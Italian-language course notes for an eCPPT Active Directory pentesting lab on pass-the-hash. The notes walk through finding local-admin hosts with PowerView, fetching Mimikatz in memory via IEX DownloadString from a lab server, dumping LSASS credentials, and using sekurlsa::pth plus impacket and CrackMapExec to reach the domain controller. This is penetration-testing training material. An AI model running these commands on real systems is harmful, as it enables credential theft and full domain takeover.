# 012 — AD Lateral Movement: Pass-the-Hash (Active Directory Penetration Testing)

> **Modulo:** Active Directory Penetration Testing · **Video:** 12/15
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [012_AD Lateral Movement_ Pass-the-Hash.txt](012_AD Lateral Movement_ Pass-the-Hash.txt) · [012_AD Lateral Movement_ Pass-the-Hash.srt](012_AD Lateral Movement_ Pass-the-Hash.srt)

## Concetti chiave

- **Pass-the-Hash (PtH)** = autenticarsi a un sistema Windows usando l'**NTLM hash** dell'utente, senza conoscere la password in chiaro.
- Sfrutta la natura **challenge-response di NTLM**: il client non manda la password ma il risultato di una funzione che usa l'hash → l'hash basta.
- Workflow del lab: **enum domain → trova host con local admin → PS remoting su quella box → estrai NTLM hash di un DA via Mimikatz → PtH → enter PS session sul DC**.
- Tool chiave: **PowerView** (`Find-LocalAdminAccess`), **Invoke-TokenManipulation**, **Invoke-Mimikatz** (`sekurlsa::logonpasswords`, `sekurlsa::pth`).
- Risultato dimostrato: estratto NTLM hash di `Administrator` da `seclogs` → PtH → PSRemoting su `prod.research.security.local` (DC).
- **Prerequisito chiave per dumpare hash**: privilegi admin/SYSTEM sul sistema da cui dumpi (l'LSASS è protetto).

## Spiegazione approfondita

### Cos'è Pass-the-Hash
Tecnica di **credential theft + reuse**: ottenuto l'hash NTLM di un utente, si può presentarlo direttamente al protocollo NTLM/SMB di un altro host e autenticarsi come se si avesse la password. Non serve crackare nulla. Funziona perché Windows usa l'hash come "shared secret" nel challenge-response NTLM.

### Perché solo NTLM (e non Kerberos puro)
Kerberos cifra timestamp/ticket con una key derivata dalla password, ma l'autenticazione si basa sui ticket emessi dal KDC. Per Kerberos l'equivalente di PtH è **Pass-the-Ticket** (video 013) o **Overpass-the-Hash** (usa l'NT hash per ottenere un TGT). PtH puro = via NTLM/SMB.

### Scenario del lab (chain completa)
```
[student]  ────(PowerView Find-LocalAdminAccess)────>  seclogs.research.security.local
            │
            ├─ enter-pssession seclogs                  (student è admin lì)
            │
            ├─ dump NTLM hash Administrator (Mimikatz)  (Administrator era logged on con type 2)
            │
            └─ PtH Administrator/Mimikatz sul client    ──> spawn powershell con privs DA
                                                              │
                                                              └─ enter-pssession prod.* (DC)  ✓ GAME OVER
```

### Step-by-step
1. **Setup PowerView sul foothold (`client`)**
   ```powershell
   powershell -ep bypass
   . .\PowerView.ps1
   Get-Domain
   ```
2. **Cerca un host dove l'utente corrente è local admin**
   ```powershell
   Find-LocalAdminAccess
   # Output: seclogs.research.security.local
   ```
3. **Remoting al target**
   ```powershell
   Enter-PSSession -ComputerName seclogs.research.security.local
   whoami; whoami /priv   # conferma privilegi elevati
   ```
4. **Hosting tool su `client` con HFS** (HTTP File Server) per trasferirli sul target:
   - `Invoke-TokenManipulation.ps1`
   - `Invoke-Mimikatz.ps1`
5. **Download in-memory sul target**
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-TokenManipulation.ps1")
   IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
   ```
6. **Enum token logged on** (per scoprire chi è loggato)
   ```powershell
   Invoke-TokenManipulation -Enumerate
   # Vede: Administrator (logon type 2 = interactive)
   ```
7. **Dump credenziali con Mimikatz**
   ```powershell
   Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
   # Cerca nell'output: NTLM hash del user Administrator
   ```
8. **Pass-the-Hash** dal foothold (in una **nuova shell PowerShell as Admin**)
   ```powershell
   powershell -ep bypass
   . .\Invoke-Mimikatz.ps1
   Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:<NTLM_HASH> /run:powershell.exe"'
   ```
   Si apre una nuova PowerShell con i token dell'utente impersonato (DA).
9. **Remoting al DC con i privilegi appena impersonati**
   ```powershell
   Enter-PSSession -ComputerName prod.research.security.local
   hostname    # PROD  -> sei sul DC
   ```

### Why it works qui
- `student` era admin su `seclogs`.
- Su `seclogs` era loggato `Administrator` (DA) → la sua LSASS conteneva credenziali in memoria → dumpabili con Mimikatz + privilege debug + token elevate.
- L'NTLM hash di un DA permette PtH ovunque nel dominio (incluso il DC).

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `Find-LocalAdminAccess` | PowerView — trova host nel dominio dove l'utente corrente è local admin | Foundamentale per trovare il prossimo hop |
| `Enter-PSSession -ComputerName <host>` | PowerShell remoting | Richiede WinRM (5985/5986) |
| HFS (HTTP File Server) | Web server portatile per trasferire payload | `C:\Tools\HFS.exe` |
| `IEX(New-Object Net.WebClient).DownloadString("<url>")` | Download in-memory di uno script `.ps1` | Fileless |
| `Invoke-TokenManipulation -Enumerate` | Enum token disponibili sul sistema | Mostra logon type (2=interactive, 3=network…) |
| `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'` | Dump credenziali da LSASS | Serve admin + SeDebug |
| `Invoke-Mimikatz -Command '"sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash> /run:powershell.exe"'` | Esecuzione PtH — spawn process con cred impersonate | Lab usa proprio questa sintassi |
| `whoami` / `whoami /priv` | Verifica identità e privilegi | |

## Esempi pratici

```powershell
# === Foothold sul client ===
powershell -ep bypass
cd C:\Tools
. .\PowerView.ps1

# 1. Trova host dove sono admin
Get-Domain
Find-LocalAdminAccess
# -> seclogs.research.security.local

# 2. Remoting
Enter-PSSession -ComputerName seclogs.research.security.local
whoami /priv

# === Da seclogs: host tool su client via HFS e fetch ===
IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-TokenManipulation.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")

# 3. Verifica chi è loggato
Invoke-TokenManipulation -Enumerate

# 4. Dump NTLM
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
# Trova: User: Administrator  Domain: RESEARCH  NTLM: <hash>

Exit-PSSession

# === Nuova PowerShell as Administrator sul client ===
powershell -ep bypass
cd C:\Tools
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:<HASH> /run:powershell.exe"'

# Nella shell spawned (impersonata DA):
Enter-PSSession -ComputerName prod.research.security.local
hostname   # -> PROD (DC)
```

```bash
# Alternative cross-platform per PtH
# CrackMapExec
crackmapexec smb <target> -u Administrator -H <NT_HASH> -d research.security.local

# impacket-psexec (PtH style)
impacket-psexec research.security.local/Administrator@<DC_IP> -hashes :<NT_HASH>

# impacket-wmiexec
impacket-wmiexec -hashes :<NT_HASH> Administrator@<DC_IP>
```

## Punti d'attenzione per l'esame eCPPT

- **PtH funziona con NTLM, non con Kerberos** — per Kerberos vedi Pass-the-Ticket (video 013) o Overpass-the-Hash.
- Serve **solo l'NT hash** (la metà NTLM), NON quello LM. Format spesso passato come `:<NThash>` (LM vuoto) in tool come psexec.py.
- **Prerequisito per dumpare LSASS**: admin locale + `SeDebugPrivilege`. La sequenza Mimikatz mostrata è esattamente `privilege::debug` → `token::elevate` → `sekurlsa::logonpasswords`. **Memorizzare**.
- **`Find-LocalAdminAccess`** (PowerView) = primo step canonico per il lateral movement. Domanda da esame.
- **`Invoke-TokenManipulation -Enumerate`** mostra il **logon type** (2 = interactive = utente realmente loggato → la sua memoria contiene cred fresh).
- **Sintassi `sekurlsa::pth`** di Mimikatz da conoscere a memoria: `/user /domain /ntlm /run`.
- **HFS** è il file server citato (`C:\Tools\HFS.exe`); è una tecnica classica per hostare payload senza scrivere su disco target.
- **IEX(New-Object Net.WebClient).DownloadString(...)** = download-and-execute fileless, da conoscere.
- Tool alternativi cross-platform per PtH: **CrackMapExec/NetExec**, **impacket-psexec / wmiexec / smbexec** (sintassi `-hashes :<NT>`).
- Differenza **PtH vs PtT** (domanda quasi certa):
  - PtH = riusi **hash NTLM** via NTLM/SMB.
  - PtT = riusi **ticket Kerberos (TGT/TGS)** via Kerberos.
- **PSRemoting** (WinRM, porta 5985) = canale standard di lateral movement con credenziali impersonate.

## Collegamenti con altri video

- Precedente: [[011_Kerberoasting]]
- Prossimo: [[013_AD Lateral Movement_ Pass-the-Ticket]] — equivalente per Kerberos.
- Teoria NTLM: [[04_Active Directory Authentication]]
- BloodHound mostra path `AdminTo`/`CanRDP`: [[08_AD Enumeration_ BloodHound]]
- Enum locale e trust: [[09_AD Enumeration_ PowerView]]
- L'NTLM hash di `KRBTGT` → [[014_AD Persistence_ Golden Ticket]]
